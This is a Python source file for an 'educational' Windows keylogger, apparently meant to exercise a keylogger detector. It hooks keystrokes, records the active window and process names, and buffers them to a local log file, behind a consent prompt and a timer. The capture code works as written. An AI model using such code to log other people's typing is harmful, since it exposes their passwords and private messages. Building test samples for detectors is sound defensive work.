# keylogger_demo/simple_keylogger.py
"""
EDUCATIONAL KEYLOGGER - Demonstrates How Keyloggers Work

WARNING: This is for educational/research purposes ONLY
- Only use with explicit consent
- Only use on your own systems
- Never use for malicious purposes

This demonstrates the techniques your detector catches:
1. Keyboard hooking
2. File logging
3. Process hiding (commented out - for demo only)
"""
import keyboard
import os
import time
from datetime import datetime
from pathlib import Path
import win32gui
import win32process
import psutil

class SimpleKeylogger:
    """
    Educational keylogger demonstrating basic techniques
    """
    
    def __init__(self, log_dir="keylogger_logs"):
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(exist_ok=True)
        
        self.log_file = self.log_dir / f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.buffer = []
        self.buffer_size = 10  # Write every 10 keystrokes
        
        print("="*60)
        print("  EDUCATIONAL KEYLOGGER")
        print("="*60)
        print("\n⚠️  WARNING: For Educational Purposes ONLY")
        print("This demonstrates techniques that your detector catches:\n")
        print("  1. ✓ Keyboard Hook Detection")
        print("  2. ✓ File System Monitoring")
        print("  3. ✓ Process Behavior Analysis")
        print("\nStarting in 3 seconds...")
        time.sleep(3)
    
    def get_active_window(self):
        """Get currently active window info - DETECTOR CATCHES THIS"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(hwnd)
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            return {
                'window': window_title,
                'process': process.name(),
                'pid': pid
            }
        except:
            return {'window': 'Unknown', 'process': 'Unknown', 'pid': None}
    
    def on_key_press(self, event):
        """
        Callback when key is pressed
        DETECTOR CATCHES: Keyboard hook via SetWindowsHookEx
        """
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        window_info = self.get_active_window()
        
        # Build log entry
        log_entry = {
            'time': timestamp,
            'key': event.name,
            'window': window_info['window'],
            'process': window_info['process']
        }
        
        # Add to buffer
        self.buffer.append(log_entry)
        
        # Print to console (for demo - real keyloggers hide this)
        print(f"[{timestamp}] Key: {event.name:10s} | Window: {window_info['window'][:30]}")
        
        # Write to file when buffer is full
        # DETECTOR CATCHES: Suspicious file writes in temp/appdata
        if len(self.buffer) >= self.buffer_size:
            self.flush_to_file()
    
    def flush_to_file(self):
        """
        Write buffer to log file
        DETECTOR CATCHES: Files with 'keylog' pattern in suspicious locations
        """
        if not self.buffer:
            return
        
        with open(self.log_file, 'a', encoding='utf-8') as f:
            for entry in self.buffer:
                f.write(f"[{entry['time']}] Key: {entry['key']} | "
                       f"Window: {entry['window']} | Process: {entry['process']}\n")
        
        print(f"\n💾 Logged {len(self.buffer)} keystrokes to {self.log_file}")
        self.buffer.clear()
    
    def start(self, duration=60):
        """
        Start keylogging for specified duration
        
        Args:
            duration: Seconds to run (default 60)
        """
        print(f"\n🔴 KEYLOGGER ACTIVE for {duration} seconds")
        print(f"📁 Logging to: {self.log_file}")
        print("\nType anything to see it captured...")
        print("Press Ctrl+C to stop early\n")
        
        # Hook keyboard - DETECTOR CATCHES THIS
        keyboard.on_press(self.on_key_press)
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n\n⚠️  Stopped by user")
        finally:
            self.stop()
    
    def stop(self):
        """Stop keylogging and cleanup"""
        keyboard.unhook_all()
        self.flush_to_file()  # Write remaining buffer
        
        print("\n" + "="*60)
        print("  KEYLOGGER STOPPED")
        print("="*60)
        print(f"\n✓ Log file: {self.log_file}")
        print(f"✓ Total size: {self.log_file.stat().st_size if self.log_file.exists() else 0} bytes")
        
        # Show what detector would catch
        print("\n🛡️  YOUR DETECTOR WOULD CATCH:")
        print("  1. ✓ Keyboard hook via SetWindowsHookEx")
        print("  2. ✓ Log file created in suspicious location")
        print("  3. ✓ Process name contains 'keylog'")
        print("  4. ✓ Frequent small file writes (buffer flushes)")
        print("="*60)

def main():
    """Demo keylogger for testing your detector"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Educational Keylogger Demo")
    parser.add_argument('--duration', type=int, default=60, 
                       help='Duration in seconds (default 60)')
    parser.add_argument('--log-dir', default='keylogger_logs',
                       help='Directory for log files')
    
    args = parser.parse_args()
    
    # Consent warning
    print("\n" + "="*60)
    print("  ⚠️  EDUCATIONAL USE ONLY - CONSENT REQUIRED")
    print("="*60)
    print("\nThis keylogger is for research/testing purposes.")
    print("It demonstrates techniques that malicious keyloggers use.")
    print("\nBy running this, you acknowledge:")
    print("  • This is YOUR system or you have permission")
    print("  • This is for educational/testing purposes")
    print("  • You will not use this maliciously")
    
    consent = input("\nDo you consent? (yes/no): ").strip().lower()
    
    if consent != 'yes':
        print("\n❌ Consent not given. Exiting.")
        return
    
    # Run keylogger
    logger = SimpleKeylogger(log_dir=args.log_dir)
    logger.start(duration=args.duration)

if __name__ == "__main__":
    main()